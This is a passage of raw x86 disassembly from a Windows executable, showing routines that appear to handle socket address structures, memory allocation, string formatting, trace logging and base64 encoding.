  40c232:	mov    esi,ebx
  40c234:	mov    DWORD PTR [ebp-0x8],ecx
  40c237:	mov    ecx,DWORD PTR [ebp+0xc]
  40c23a:	push   edi
  40c23b:	mov    edi,eax
  40c23d:	cmp    ecx,0xffff
  40c243:	ja     0x40c2ca
  40c249:	cmp    DWORD PTR [ebp+0x18],ebx
  40c24c:	je     0x40c2a9
  40c24e:	add    ecx,ecx
  40c250:	call   0x40c854
  40c255:	mov    ebx,eax
  40c257:	test   ebx,ebx
  40c259:	je     0x40c2ca
  40c25b:	mov    edx,DWORD PTR [ebp+0xc]
  40c25e:	mov    ecx,DWORD PTR [ebp+0x8]
  40c261:	push   ebx
  40c262:	call   0x40c8b0
  40c267:	mov    esi,ebx
  40c269:	lea    ecx,[esi+0x1]
  40c26c:	mov    al,BYTE PTR [esi]
  40c26e:	inc    esi
  40c26f:	test   al,al
  40c271:	jne    0x40c26c
  40c273:	sub    esi,ecx
  40c275:	mov    eax,esi
  40c277:	je     0x40c2c4
  40c279:	cmp    eax,0x20
  40c27c:	jbe    0x40c281
  40c27e:	push   0x20
  40c280:	pop    eax
  40c281:	push   ebx
  40c282:	push   eax
  40c283:	mov    eax,DWORD PTR [ebp-0x8]
  40c286:	push   0x402de8
  40c28b:	push   0x403df8
  40c290:	sub    eax,edi
  40c292:	push   eax
  40c293:	push   edi
  40c294:	call   0x40c736
  40c299:	add    esp,0x18
  40c29c:	mov    edi,eax
  40c29e:	mov    eax,esi
  40c2a0:	test   esi,esi
  40c2a2:	jne    0x40c279
  40c2a4:	mov    eax,DWORD PTR [ebp-0x4]
  40c2a7:	jmp    0x40c2c6
  40c2a9:	push   ecx
  40c2aa:	push   ecx
  40c2ab:	push   0x402de8
  40c2b0:	push   ecx
  40c2b1:	push   DWORD PTR [ebp+0x8]
  40c2b4:	mov    ecx,eax
  40c2b6:	call   0x40c161
  40c2bb:	mov    edi,eax
  40c2bd:	mov    eax,DWORD PTR [ebp-0x4]
  40c2c0:	add    edi,eax
  40c2c2:	jmp    0x40c2c6
  40c2c4:	mov    eax,edi
  40c2c6:	mov    esi,edi
  40c2c8:	sub    esi,eax
  40c2ca:	mov    ecx,ebx
  40c2cc:	call   0x40c80e
  40c2d1:	pop    edi
  40c2d2:	mov    eax,esi
  40c2d4:	pop    esi
  40c2d5:	pop    ebx
  40c2d6:	mov    esp,ebp
  40c2d8:	pop    ebp
  40c2d9:	ret    0x14
  40c2dc:	int3   
  40c2dd:	int3   
  40c2de:	int3   
  40c2df:	int3   
  40c2e0:	int3   
  40c2e1:	mov    edi,edi
  40c2e3:	push   ebp
  40c2e4:	mov    ebp,esp
  40c2e6:	sub    esp,0xc
  40c2e9:	xor    eax,eax
  40c2eb:	push   eax
  40c2ec:	push   0x4
  40c2ee:	pop    ecx
  40c2ef:	push   ecx
  40c2f0:	mov    DWORD PTR [ebp-0x4],eax
  40c2f3:	mov    DWORD PTR [ebp-0x8],eax
  40c2f6:	mov    DWORD PTR [ebp-0xc],eax
  40c2f9:	lea    eax,[ebp-0x4]
  40c2fc:	push   eax
  40c2fd:	push   ecx
  40c2fe:	lea    eax,[ebp-0x8]
  40c301:	push   eax
  40c302:	push   ecx
  40c303:	lea    eax,[ebp-0xc]
  40c306:	push   eax
  40c307:	push   ecx
  40c308:	lea    eax,[ebp+0x14]
  40c30b:	push   eax
  40c30c:	push   ecx
  40c30d:	lea    eax,[ebp+0x10]
  40c310:	push   eax
  40c311:	push   0xc
  40c313:	push   0x403e14
  40c318:	push   0x2b
  40c31a:	push   DWORD PTR [ebp+0xc]
  40c31d:	push   DWORD PTR [ebp+0x8]
  40c320:	call   DWORD PTR ds:0x4131cc
  40c326:	add    esp,0x40
  40c329:	mov    esp,ebp
  40c32b:	pop    ebp
  40c32c:	ret    0x1c
  40c32f:	int3   
  40c330:	int3   
  40c331:	int3   
  40c332:	int3   
  40c333:	int3   
  40c334:	mov    edi,edi
  40c336:	push   ebp
  40c337:	mov    ebp,esp
  40c339:	sub    esp,0x14
  40c33c:	xor    eax,eax
  40c33e:	or     DWORD PTR [ebp-0x14],0xffffffff
  40c342:	push   eax
  40c343:	push   0x4
  40c345:	pop    ecx
  40c346:	push   ecx
  40c347:	mov    DWORD PTR [ebp-0x4],eax
  40c34a:	mov    DWORD PTR [ebp-0x8],eax
  40c34d:	mov    DWORD PTR [ebp-0xc],eax
  40c350:	mov    DWORD PTR [ebp-0x10],eax
  40c353:	lea    eax,[ebp-0x4]
  40c356:	push   eax
  40c357:	push   ecx
  40c358:	lea    eax,[ebp-0x8]
  40c35b:	push   eax
  40c35c:	push   ecx
  40c35d:	lea    eax,[ebp-0xc]
  40c360:	push   eax
  40c361:	push   ecx
  40c362:	lea    eax,[ebp-0x10]
  40c365:	push   eax
  40c366:	push   ecx
  40c367:	lea    eax,[ebp-0x14]
  40c36a:	push   eax
  40c36b:	push   ecx
  40c36c:	lea    eax,[ebp+0x14]
  40c36f:	push   eax
  40c370:	push   ecx
  40c371:	lea    eax,[ebp+0x10]
  40c374:	push   eax
  40c375:	push   0x16
  40c377:	push   0x403e14
  40c37c:	push   0x2b
  40c37e:	push   DWORD PTR [ebp+0xc]
  40c381:	push   DWORD PTR [ebp+0x8]
  40c384:	call   DWORD PTR ds:0x4131cc
  40c38a:	add    esp,0x50
  40c38d:	mov    esp,ebp
  40c38f:	pop    ebp
  40c390:	ret    0x24
  40c393:	int3   
  40c394:	int3   
  40c395:	int3   
  40c396:	int3   
  40c397:	int3   
  40c398:	mov    edi,edi
  40c39a:	push   ebp
  40c39b:	mov    ebp,esp
  40c39d:	push   ecx
  40c39e:	and    DWORD PTR [ebp-0x4],0x0
  40c3a2:	mov    ecx,DWORD PTR [ebp+0x14]
  40c3a5:	push   esi
  40c3a6:	test   ecx,ecx
  40c3a8:	je     0x40c3bb
  40c3aa:	mov    edx,ecx
  40c3ac:	lea    esi,[edx+0x1]
  40c3af:	mov    al,BYTE PTR [edx]
  40c3b1:	inc    edx
  40c3b2:	test   al,al
  40c3b4:	jne    0x40c3af
  40c3b6:	sub    edx,esi
  40c3b8:	inc    edx
  40c3b9:	jmp    0x40c3be
  40c3bb:	push   0x5
  40c3bd:	pop    edx
  40c3be:	test   ecx,ecx
  40c3c0:	jne    0x40c3c7
  40c3c2:	mov    ecx,0x4035c0
  40c3c7:	push   0x0
  40c3c9:	push   0x4
  40c3cb:	lea    eax,[ebp-0x4]
  40c3ce:	push   eax
  40c3cf:	push   edx
  40c3d0:	push   ecx
  40c3d1:	push   0x4
  40c3d3:	lea    eax,[ebp+0x10]
  40c3d6:	push   eax
  40c3d7:	push   0xd
  40c3d9:	push   0x403e14
  40c3de:	push   0x2b
  40c3e0:	push   DWORD PTR [ebp+0xc]
  40c3e3:	push   DWORD PTR [ebp+0x8]
  40c3e6:	call   DWORD PTR ds:0x4131cc
  40c3ec:	add    esp,0x30
  40c3ef:	pop    esi
  40c3f0:	mov    esp,ebp
  40c3f2:	pop    ebp
  40c3f3:	ret    0x14
  40c3f6:	int3   
  40c3f7:	int3   
  40c3f8:	int3   
  40c3f9:	int3   
  40c3fa:	int3   
  40c3fb:	mov    edi,edi
  40c3fd:	push   ecx
  40c3fe:	push   ebx
  40c3ff:	push   esi
  40c400:	push   edi
  40c401:	mov    ebx,edx
  40c403:	mov    esi,ecx
  40c405:	mov    eax,ds:0x41186c
  40c40a:	cmp    eax,0x41186c
  40c40f:	je     0x40c42a
  40c411:	test   DWORD PTR [eax+0x1c],0x400
  40c418:	je     0x40c42a
  40c41a:	sub    esp,0xc
  40c41d:	push   ebx
  40c41e:	push   esi
  40c41f:	push   DWORD PTR [eax+0x14]
  40c422:	push   DWORD PTR [eax+0x10]
  40c425:	call   0x40c2e1
  40c42a:	push   0x40
  40c42c:	push   0x0
  40c42e:	push   esi
  40c42f:	call   0x40d4a8
  40c434:	movzx  ecx,WORD PTR [ebx]
  40c437:	add    esp,0xc
  40c43a:	call   0x40c993
  40c43f:	test   eax,eax
  40c441:	je     0x40c448
  40c443:	mov    edi,DWORD PTR [eax+0x8]
  40c446:	jmp    0x40c44a
  40c448:	xor    edi,edi
  40c44a:	cmp    edi,0x20
  40c44d:	jbe    0x40c453
  40c44f:	xor    eax,eax
  40c451:	jmp    0x40c46c
  40c453:	push   edi
  40c454:	push   ebx
  40c455:	push   esi
  40c456:	call   0x40d49c
  40c45b:	and    DWORD PTR [esi+0x24],0x0
  40c45f:	xor    eax,eax
  40c461:	and    DWORD PTR [esi+0x28],0x0
  40c465:	add    esp,0xc
  40c468:	mov    DWORD PTR [esi+0x20],edi
  40c46b:	inc    eax
  40c46c:	pop    edi
  40c46d:	pop    esi
  40c46e:	pop    ebx
  40c46f:	pop    ecx
  40c470:	ret    0xc
  40c473:	int3   
  40c474:	int3   
  40c475:	int3   
  40c476:	int3   
  40c477:	int3   
  40c478:	mov    edi,edi
  40c47a:	push   esi
  40c47b:	push   edi
  40c47c:	mov    edi,edx
  40c47e:	mov    esi,ecx
  40c480:	mov    eax,ds:0x41186c
  40c485:	cmp    eax,0x41186c
  40c48a:	je     0x40c4af
  40c48c:	test   DWORD PTR [eax+0x1c],0x400
  40c493:	je     0x40c4af
  40c495:	push   ecx
  40c496:	push   edi
  40c497:	call   DWORD PTR ds:0x413018
  40c49d:	push   eax
  40c49e:	mov    eax,ds:0x41186c
  40c4a3:	push   esi
  40c4a4:	push   DWORD PTR [eax+0x14]
  40c4a7:	push   DWORD PTR [eax+0x10]
  40c4aa:	call   0x40c398
  40c4af:	push   0x40
  40c4b1:	push   0x0
  40c4b3:	push   esi
  40c4b4:	call   0x40d4a8
  40c4b9:	add    esp,0xc
  40c4bc:	mov    DWORD PTR [esi+0x4],edi
  40c4bf:	mov    DWORD PTR [esi+0x20],0x10
  40c4c6:	push   0x2
  40c4c8:	pop    eax
  40c4c9:	mov    WORD PTR [esi],ax
  40c4cc:	xor    eax,eax
  40c4ce:	pop    edi
  40c4cf:	mov    WORD PTR [esi+0x2],ax
  40c4d3:	pop    esi
  40c4d4:	ret    0x4
  40c4d7:	int3   
  40c4d8:	int3   
  40c4d9:	int3   
  40c4da:	int3   
  40c4db:	int3   
  40c4dc:	test   ecx,ecx
  40c4de:	jne    0x40c4e6
  40c4e0:	mov    eax,0x403e04
  40c4e5:	ret    
  40c4e6:	movzx  eax,WORD PTR [ecx]
  40c4e9:	cmp    eax,0x2
  40c4ec:	jne    0x40c4f8
  40c4ee:	push   DWORD PTR [ecx+0x4]
  40c4f1:	call   DWORD PTR ds:0x413018
  40c4f7:	ret    
  40c4f8:	cmp    eax,0x17
  40c4fb:	jne    0x40c505
  40c4fd:	add    ecx,0x8
  40c500:	jmp    0x40c9bb
  40c505:	xor    eax,eax
  40c507:	ret    
  40c508:	int3   
  40c509:	int3   
  40c50a:	int3   
  40c50b:	int3   
  40c50c:	int3   
  40c50d:	mov    edi,edi
  40c50f:	push   ebx
  40c510:	push   esi
  40c511:	push   edi
  40c512:	mov    edi,ecx
  40c514:	mov    eax,ds:0x41186c
  40c519:	mov    ebx,0x41186c
  40c51e:	cmp    eax,ebx
  40c520:	je     0x40c53c
  40c522:	test   BYTE PTR [eax+0x1c],0x1
  40c526:	je     0x40c53c
  40c528:	push   edi
  40c529:	push   DWORD PTR [eax+0x14]
  40c52c:	mov    edx,0x403e14
  40c531:	push   DWORD PTR [eax+0x10]
  40c534:	push   0x11
  40c536:	pop    ecx
  40c537:	call   0x40bcfd
  40c53c:	push   0x40
  40c53e:	mov    eax,edi
  40c540:	pop    ecx
  40c541:	mul    ecx
  40c543:	test   edx,edx
  40c545:	jne    0x40c580
  40c547:	cmp    eax,0xffffffff
  40c54a:	ja     0x40c580
  40c54c:	lea    ecx,[eax+0x20]
  40c54f:	cmp    ecx,eax
  40c551:	jb     0x40c580
  40c553:	call   0x40c854
  40c558:	mov    esi,eax
  40c55a:	test   esi,esi
  40c55c:	je     0x40c580
  40c55e:	mov    DWORD PTR [esi],edi
  40c560:	mov    eax,ds:0x41186c
  40c565:	cmp    eax,ebx
  40c567:	je     0x40c57c
  40c569:	test   BYTE PTR [eax+0x1c],0x1
  40c56d:	je     0x40c57c
  40c56f:	push   esi
  40c570:	push   edi
  40c571:	push   DWORD PTR [eax+0x14]
  40c574:	push   DWORD PTR [eax+0x10]
  40c577:	call   0x40c12d
  40c57c:	mov    eax,esi
  40c57e:	jmp    0x40c582
  40c580:	xor    eax,eax
  40c582:	pop    edi
  40c583:	pop    esi
  40c584:	pop    ebx
  40c585:	ret    
  40c586:	int3   
  40c587:	int3   
  40c588:	int3   
  40c589:	int3   
  40c58a:	int3   
  40c58b:	mov    edi,edi
  40c58d:	push   ecx
  40c58e:	push   ebx
  40c58f:	push   esi
  40c590:	push   edi
  40c591:	mov    edi,ecx
  40c593:	test   edi,edi
  40c595:	jne    0x40c5a8
  40c597:	test   edx,edx
  40c599:	je     0x40c5a4
  40c59b:	mov    ecx,edx
  40c59d:	call   0x40c50d
  40c5a2:	jmp    0x40c5d9
  40c5a4:	xor    eax,eax
  40c5a6:	jmp    0x40c5d9
  40c5a8:	mov    ecx,DWORD PTR [edi+0x4]
  40c5ab:	add    ecx,edx
  40c5ad:	call   0x40c50d
  40c5b2:	mov    ebx,eax
  40c5b4:	test   ebx,ebx
  40c5b6:	je     0x40c5a4
  40c5b8:	mov    eax,DWORD PTR [edi+0x4]
  40c5bb:	mov    esi,DWORD PTR [ebx]
  40c5bd:	shl    eax,0x6
  40c5c0:	add    eax,0x20
  40c5c3:	push   eax
  40c5c4:	push   edi
  40c5c5:	push   ebx
  40c5c6:	call   0x40d49c
  40c5cb:	add    esp,0xc
  40c5ce:	mov    DWORD PTR [ebx],esi
  40c5d0:	mov    ecx,edi
  40c5d2:	call   0x40c80e
  40c5d7:	mov    eax,ebx
  40c5d9:	pop    edi
  40c5da:	pop    esi
  40c5db:	pop    ebx
  40c5dc:	pop    ecx
  40c5dd:	ret    0x4
  40c5e0:	int3   
  40c5e1:	int3   
  40c5e2:	int3   
  40c5e3:	int3   
  40c5e4:	int3   
  40c5e5:	mov    edi,edi
  40c5e7:	push   esi
  40c5e8:	mov    esi,edx
  40c5ea:	mov    edx,ecx
  40c5ec:	test   edx,edx
  40c5ee:	jne    0x40c5f4
  40c5f0:	xor    eax,eax
  40c5f2:	jmp    0x40c61b
  40c5f4:	push   ebx
  40c5f5:	mov    ebx,DWORD PTR [edx+0x4]
  40c5f8:	cmp    ebx,DWORD PTR [edx]
  40c5fa:	jb     0x40c600
  40c5fc:	xor    eax,eax
  40c5fe:	jmp    0x40c61a
  40c600:	push   edi
  40c601:	mov    eax,ebx
  40c603:	lea    edi,[edx+0x20]
  40c606:	shl    eax,0x6
  40c609:	add    edi,eax
  40c60b:	lea    eax,[ebx+0x1]
  40c60e:	push   0x10
  40c610:	pop    ecx
  40c611:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c613:	mov    DWORD PTR [edx+0x4],eax
  40c616:	xor    eax,eax
  40c618:	inc    eax
  40c619:	pop    edi
  40c61a:	pop    ebx
  40c61b:	pop    esi
  40c61c:	ret    0x8
  40c61f:	int3   
  40c620:	int3   
  40c621:	int3   
  40c622:	int3   
  40c623:	int3   
  40c624:	mov    edi,edi
  40c626:	push   ebp
  40c627:	mov    ebp,esp
  40c629:	sub    esp,0x44
  40c62c:	push   ebx
  40c62d:	push   esi
  40c62e:	push   edi
  40c62f:	push   0x40
  40c631:	lea    eax,[ebp-0x40]
  40c634:	mov    esi,edx
  40c636:	push   0x0
  40c638:	push   eax
  40c639:	mov    ebx,ecx
  40c63b:	call   0x40d4a8
  40c640:	push   0x17
  40c642:	pop    eax
  40c643:	mov    WORD PTR [ebp-0x40],ax
  40c647:	lea    edi,[ebp-0x38]
  40c64a:	xor    eax,eax
  40c64c:	lea    edx,[ebp-0x40]
  40c64f:	and    DWORD PTR [ebp-0x28],eax
  40c652:	add    esp,0x4
  40c655:	mov    WORD PTR [ebp-0x3e],ax
  40c659:	mov    ecx,ebx
  40c65b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c65f:	mov    DWORD PTR [ebp-0x20],0x1c
  40c666:	call   0x40c5e5
  40c66b:	pop    edi
  40c66c:	pop    esi
  40c66d:	pop    ebx
  40c66e:	mov    esp,ebp
  40c670:	pop    ebp
  40c671:	ret    0x8
  40c674:	int3   
  40c675:	int3   
  40c676:	int3   
  40c677:	int3   
  40c678:	int3   
  40c679:	mov    edi,edi
  40c67b:	push   ebp
  40c67c:	mov    ebp,esp
  40c67e:	sub    esp,0x10
  40c681:	or     DWORD PTR [ebp-0x4],0xffffffff
  40c685:	push   ebx
  40c686:	push   esi
  40c687:	push   edi
  40c688:	mov    edi,edx
  40c68a:	mov    ebx,ecx
  40c68c:	xor    esi,esi
  40c68e:	mov    eax,ds:0x41186c
  40c693:	cmp    eax,0x41186c
  40c698:	je     0x40c6b5
  40c69a:	test   BYTE PTR [eax+0x1c],0x1
  40c69e:	je     0x40c6b5
  40c6a0:	sub    esp,0x14
  40c6a3:	push   edi
  40c6a4:	push   ebx
  40c6a5:	push   DWORD PTR [eax+0x14]
  40c6a8:	push   DWORD PTR [eax+0x10]
  40c6ab:	call   0x40c334
  40c6b0:	mov    eax,ds:0x41186c
  40c6b5:	test   edi,edi
  40c6b7:	jne    0x40c6bd
  40c6b9:	xor    eax,eax
  40c6bb:	jmp    0x40c728
  40c6bd:	mov    DWORD PTR [ebp-0x8],esi
  40c6c0:	cmp    DWORD PTR [edi+0x4],esi
  40c6c3:	jbe    0x40c70a
  40c6c5:	lea    ecx,[edi+0x20]
  40c6c8:	mov    DWORD PTR [ebp-0xc],ecx
  40c6cb:	push   ecx
  40c6cc:	push   ecx
  40c6cd:	mov    edx,ecx
  40c6cf:	mov    ecx,ebx
  40c6d1:	call   0x40c5e5
  40c6d6:	test   eax,eax
  40c6d8:	je     0x40c6e2
  40c6da:	sub    DWORD PTR [ebp-0x4],0x1
  40c6de:	je     0x40c705
  40c6e0:	jmp    0x40c6e9
  40c6e2:	mov    eax,DWORD PTR [ebx+0x4]
  40c6e5:	cmp    eax,DWORD PTR [ebx]
  40c6e7:	je     0x40c700
  40c6e9:	mov    eax,DWORD PTR [ebp-0x8]
  40c6ec:	mov    ecx,DWORD PTR [ebp-0xc]
  40c6ef:	inc    eax
  40c6f0:	add    ecx,0x40
  40c6f3:	mov    DWORD PTR [ebp-0x8],eax
  40c6f6:	mov    DWORD PTR [ebp-0xc],ecx
  40c6f9:	cmp    eax,DWORD PTR [edi+0x4]
  40c6fc:	jb     0x40c6cb
  40c6fe:	jmp    0x40c705
  40c700:	mov    esi,0xea
  40c705:	mov    eax,ds:0x41186c
  40c70a:	cmp    eax,0x41186c
  40c70f:	je     0x40c726
  40c711:	test   BYTE PTR [eax+0x1c],0x1
  40c715:	je     0x40c726
  40c717:	push   DWORD PTR [ebx+0x4]
  40c71a:	push   esi
  40c71b:	push   DWORD PTR [eax+0x14]
  40c71e:	push   DWORD PTR [eax+0x10]
  40c721:	call   0x40c0f9
  40c726:	mov    eax,esi
  40c728:	pop    edi
  40c729:	pop    esi
  40c72a:	pop    ebx
  40c72b:	mov    esp,ebp
  40c72d:	pop    ebp
  40c72e:	ret    0x14
  40c731:	int3   
  40c732:	int3   
  40c733:	int3   
  40c734:	int3   
  40c735:	int3   
  40c736:	mov    edi,edi
  40c738:	push   ebp
  40c739:	mov    ebp,esp
  40c73b:	push   ecx
  40c73c:	mov    edx,DWORD PTR [ebp+0xc]
  40c73f:	push   esi
  40c740:	xor    esi,esi
  40c742:	mov    DWORD PTR [ebp-0x4],esi
  40c745:	test   edx,edx
  40c747:	jns    0x40c74d
  40c749:	xor    eax,eax
  40c74b:	jmp    0x40c76b
  40c74d:	lea    eax,[ebp+0x14]
  40c750:	push   eax
  40c751:	push   DWORD PTR [ebp+0x10]
  40c754:	lea    eax,[ebp-0x4]
  40c757:	push   ecx
  40c758:	push   ecx
  40c759:	mov    ecx,DWORD PTR [ebp+0x8]
  40c75c:	push   eax
  40c75d:	call   0x40c775
  40c762:	test   eax,eax
  40c764:	js     0x40c769
  40c766:	mov    esi,DWORD PTR [ebp-0x4]
  40c769:	mov    eax,esi
  40c76b:	pop    esi
  40c76c:	mov    esp,ebp
  40c76e:	pop    ebp
  40c76f:	ret    
  40c770:	int3   
  40c771:	int3   
  40c772:	int3   
  40c773:	int3   
  40c774:	int3   
  40c775:	mov    edi,edi
  40c777:	push   ebp
  40c778:	mov    ebp,esp
  40c77a:	push   ebx
  40c77b:	push   esi
  40c77c:	xor    esi,esi
  40c77e:	mov    ebx,ecx
  40c780:	mov    ecx,0x80070057
  40c785:	test   edx,edx
  40c787:	je     0x40c791
  40c789:	cmp    edx,0x7fffffff
  40c78f:	jbe    0x40c793
  40c791:	mov    esi,ecx
  40c793:	test   esi,esi
  40c795:	js     0x40c7fa
  40c797:	xor    esi,esi
  40c799:	test   edx,edx
  40c79b:	jne    0x40c7b3
  40c79d:	mov    eax,DWORD PTR [ebp+0x14]
  40c7a0:	cmp    BYTE PTR [eax],dl
  40c7a2:	je     0x40c7ef
  40c7a4:	test   ebx,ebx
  40c7a6:	jne    0x40c7ac
  40c7a8:	mov    esi,ecx
  40c7aa:	jmp    0x40c801
  40c7ac:	mov    esi,0x8007007a
  40c7b1:	jmp    0x40c7ef
  40c7b3:	push   edi
  40c7b4:	push   DWORD PTR [ebp+0x18]
  40c7b7:	lea    edi,[edx-0x1]
  40c7ba:	xor    esi,esi
  40c7bc:	push   DWORD PTR [ebp+0x14]
  40c7bf:	push   edi
  40c7c0:	push   edx
  40c7c1:	push   ebx
  40c7c2:	call   DWORD PTR ds:0x4131a0
  40c7c8:	add    esp,0x14
  40c7cb:	mov    ecx,0x8007007a
  40c7d0:	test   eax,eax
  40c7d2:	js     0x40c7de
  40c7d4:	cmp    eax,edi
  40c7d6:	ja     0x40c7de
  40c7d8:	je     0x40c7e0
  40c7da:	mov    edi,eax
  40c7dc:	jmp    0x40c7e4
  40c7de:	mov    esi,ecx
  40c7e0:	mov    BYTE PTR [edi+ebx*1],0x0
  40c7e4:	add    ebx,edi
  40c7e6:	pop    edi
  40c7e7:	test   esi,esi
  40c7e9:	jns    0x40c7ef
  40c7eb:	cmp    esi,ecx
  40c7ed:	jne    0x40c801
  40c7ef:	mov    eax,DWORD PTR [ebp+0x8]
  40c7f2:	test   eax,eax
  40c7f4:	je     0x40c801
  40c7f6:	mov    DWORD PTR [eax],ebx
  40c7f8:	jmp    0x40c801
  40c7fa:	test   edx,edx
  40c7fc:	je     0x40c801
  40c7fe:	mov    BYTE PTR [ebx],0x0
  40c801:	mov    eax,esi
  40c803:	pop    esi
  40c804:	pop    ebx
  40c805:	pop    ebp
  40c806:	ret    0x14
  40c809:	int3   
  40c80a:	int3   
  40c80b:	int3   
  40c80c:	int3   
  40c80d:	int3   
  40c80e:	mov    edi,edi
  40c810:	push   ebp
  40c811:	mov    ebp,esp
  40c813:	push   ecx
  40c814:	mov    eax,ds:0x40e004
  40c819:	xor    eax,ebp
  40c81b:	mov    DWORD PTR [ebp-0x4],eax
  40c81e:	test   ecx,ecx
  40c820:	je     0x40c841
  40c822:	push   esi
  40c823:	mov    esi,DWORD PTR ds:0x411c00
  40c829:	push   ecx
  40c82a:	test   esi,esi
  40c82c:	je     0x40c83a
  40c82e:	mov    ecx,esi
  40c830:	call   DWORD PTR ds:0x4131f4
  40c836:	call   esi
  40c838:	jmp    0x40c840
  40c83a:	call   DWORD PTR ds:0x41308c
  40c840:	pop    esi
  40c841:	mov    ecx,DWORD PTR [ebp-0x4]
  40c844:	xor    ecx,ebp
  40c846:	call   0x40cd10
  40c84b:	mov    esp,ebp
  40c84d:	pop    ebp
  40c84e:	ret    
  40c84f:	int3   
  40c850:	int3   
  40c851:	int3   
  40c852:	int3   
  40c853:	int3   
  40c854:	mov    edi,edi
  40c856:	push   ebp
  40c857:	mov    ebp,esp
  40c859:	push   ecx
  40c85a:	mov    eax,ds:0x40e004
  40c85f:	xor    eax,ebp
  40c861:	mov    DWORD PTR [ebp-0x4],eax
  40c864:	push   esi
  40c865:	push   edi
  40c866:	mov    edi,DWORD PTR ds:0x411c04
  40c86c:	mov    esi,ecx
  40c86e:	push   esi
  40c86f:	test   edi,edi
  40c871:	je     0x40c893
  40c873:	mov    ecx,edi
  40c875:	call   DWORD PTR ds:0x4131f4
  40c87b:	call   edi
  40c87d:	mov    edi,eax
  40c87f:	test   edi,edi
  40c881:	je     0x40c89b
  40c883:	push   esi
  40c884:	push   0x0
  40c886:	push   edi
  40c887:	call   0x40d4a8
  40c88c:	add    esp,0xc
  40c88f:	mov    eax,edi
  40c891:	jmp    0x40c89b
  40c893:	push   0x40
  40c895:	call   DWORD PTR ds:0x413090
  40c89b:	mov    ecx,DWORD PTR [ebp-0x4]
  40c89e:	pop    edi
  40c89f:	xor    ecx,ebp
  40c8a1:	pop    esi
  40c8a2:	call   0x40cd10
  40c8a7:	mov    esp,ebp
  40c8a9:	pop    ebp
  40c8aa:	ret    
  40c8ab:	int3   
  40c8ac:	int3   
  40c8ad:	int3   
  40c8ae:	int3   
  40c8af:	int3   
  40c8b0:	mov    edi,edi
  40c8b2:	push   ebp
  40c8b3:	mov    ebp,esp
  40c8b5:	push   ecx
  40c8b6:	push   ebx
  40c8b7:	push   esi
  40c8b8:	push   edi
  40c8b9:	mov    ebx,edx
  40c8bb:	mov    DWORD PTR [ebp-0x4],ecx
  40c8be:	xor    esi,esi
  40c8c0:	xor    edi,edi
  40c8c2:	mov    eax,ecx
  40c8c4:	cmp    ebx,0x2
  40c8c7:	jae    0x40c8d0
  40c8c9:	xor    eax,eax
  40c8cb:	jmp    0x40c985
  40c8d0:	mov    edx,DWORD PTR [ebp+0x8]
  40c8d3:	push   0x3
  40c8d5:	pop    ecx
  40c8d6:	movzx  eax,BYTE PTR [eax]
  40c8d9:	dec    ebx
  40c8da:	shl    esi,0x8
  40c8dd:	add    esi,eax
  40c8df:	mov    eax,DWORD PTR [ebp-0x4]
  40c8e2:	inc    eax
  40c8e3:	inc    edi
  40c8e4:	mov    DWORD PTR [ebp-0x4],eax
  40c8e7:	cmp    edi,ecx
  40c8e9:	jne    0x40c932
  40c8eb:	mov    eax,esi
  40c8ed:	shr    eax,0x12
  40c8f0:	push   0x3f
  40c8f2:	pop    edi
  40c8f3:	and    eax,edi
  40c8f5:	mov    al,BYTE PTR [eax+0x403e30]
  40c8fb:	mov    BYTE PTR [edx],al
  40c8fd:	mov    eax,esi
  40c8ff:	shr    eax,0xc
  40c902:	and    eax,edi
  40c904:	mov    al,BYTE PTR [eax+0x403e30]
  40c90a:	mov    BYTE PTR [edx+0x1],al
  40c90d:	mov    eax,esi
  40c90f:	shr    eax,0x6
  40c912:	and    esi,edi
  40c914:	and    eax,edi
  40c916:	mov    al,BYTE PTR [eax+0x403e30]
  40c91c:	mov    BYTE PTR [edx+0x2],al
  40c91f:	mov    al,BYTE PTR [esi+0x403e30]
  40c925:	xor    esi,esi
  40c927:	mov    BYTE PTR [edx+0x3],al
  40c92a:	add    edx,0x4
  40c92d:	mov    eax,DWORD PTR [ebp-0x4]
  40c930:	xor    edi,edi
  40c932:	test   ebx,ebx
  40c934:	jne    0x40c8d6
  40c936:	test   edi,edi
  40c938:	je     0x40c983
  40c93a:	sub    ecx,edi
  40c93c:	shl    ecx,0x3
  40c93f:	shl    esi,cl
  40c941:	mov    eax,esi
  40c943:	shr    eax,0x12
  40c946:	and    eax,0x3f
  40c949:	mov    al,BYTE PTR [eax+0x403e30]
  40c94f:	mov    BYTE PTR [edx],al
  40c951:	mov    eax,esi
  40c953:	shr    eax,0xc
  40c956:	and    eax,0x3f
  40c959:	mov    al,BYTE PTR [eax+0x403e30]
  40c95f:	mov    BYTE PTR [edx+0x1],al
  40c962:	cmp    edi,0x2
  40c965:	jne    0x40c978
  40c967:	shr    esi,0x6
  40c96a:	and    esi,0x3f
  40c96d:	mov    al,BYTE PTR [esi+0x403e30]
  40c973:	mov    BYTE PTR [edx+0x2],al
  40c976:	jmp    0x40c97c
  40c978:	mov    BYTE PTR [edx+0x2],0x3d
  40c97c:	add    edx,0x3
  40c97f:	mov    BYTE PTR [edx],0x3d
  40c982:	inc    edx
  40c983:	mov    eax,edx
  40c985:	pop    edi
  40c986:	pop    esi
  40c987:	pop    ebx
  40c988:	mov    esp,ebp
  40c98a:	pop    ebp
  40c98b:	ret    0x4
  40c98e:	int3   
  40c98f:	int3   
  40c990:	int3   
  40c991:	int3   
  40c992:	int3   
  40c993:	xor    eax,eax
  40c995:	cmp    ecx,0x2
  40c998:	jne    0x40c9a0
  40c99a:	mov    eax,0x403e70
  40c99f:	ret    
  40c9a0:	cmp    ecx,0x17
  40c9a3:	jne    0x40c9ab
  40c9a5:	mov    eax,0x403e80
  40c9aa:	ret    
  40c9ab:	cmp    ecx,0x16
  40c9ae:	jne    0x40c9b5
  40c9b0:	mov    eax,0x403e90
  40c9b5:	ret    
  40c9b6:	int3   
  40c9b7:	int3   
  40c9b8:	int3   
  40c9b9:	int3   
  40c9ba:	int3   
  40c9bb:	xor    eax,eax
  40c9bd:	test   ecx,ecx
  40c9bf:	je     0x40c9f3
  40c9c1:	cmp    DWORD PTR [ecx+0x8],0xffff0000
  40c9c8:	jne    0x40c9dd
  40c9ca:	cmp    DWORD PTR [ecx+0x4],eax
  40c9cd:	jne    0x40c9dd
  40c9cf:	cmp    DWORD PTR [ecx],eax
